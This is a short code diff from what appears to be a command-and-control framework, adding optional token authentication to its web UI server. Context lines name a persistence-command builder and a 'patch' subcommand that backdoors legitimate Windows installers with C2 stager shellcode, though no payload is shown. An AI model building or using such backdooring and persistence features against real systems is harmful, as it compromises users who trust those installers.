@@ -903,11 +903,18 @@ def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | Non
 
 def cmd_serve(args, cfg, ws):
     from core.engage import EngagementDB
+    from server.https_server import set_ui_token
     port      = args.port      or cfg.get("http_port",   8443)
     mgmt_port = args.mgmt_port or cfg.get("mgmt_port",   8444)
     db_path   = ws.path("engagement.db")
     db        = EngagementDB(db_path)
     set_engage_db(db)
+    ui_tok = getattr(args, "ui_token", "") or cfg.get("ui_token", "")
+    if ui_tok:
+        set_ui_token(ui_tok)
+        print(f"[+] UI auth       : enabled")
+    else:
+        print(f"[+] UI auth       : disabled (pass --ui-token to enable)")
     print(f"[+] Engagement DB : {db_path}")
     start_server(
         workspace       = ws.directory,
@@ -1536,6 +1543,8 @@ def main():
     serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
     serve_p.add_argument("--mgmt-port", type=int, metavar="PORT", dest="mgmt_port",
                          help="Management API port for 'lilith c2' (default 8444)")
+    serve_p.add_argument("--ui-token",  metavar="TOKEN", dest="ui_token", default="",
+                         help="Operator token for web UI auth (empty = no auth)")
 
     patch_p = sub.add_parser("patch", help="Backdoor a PE installer with the C2 stager shellcode")
     patch_p.add_argument("--target",  required=True,  metavar="EXE",  help="Legitimate PE to backdoor (not modified in place)")
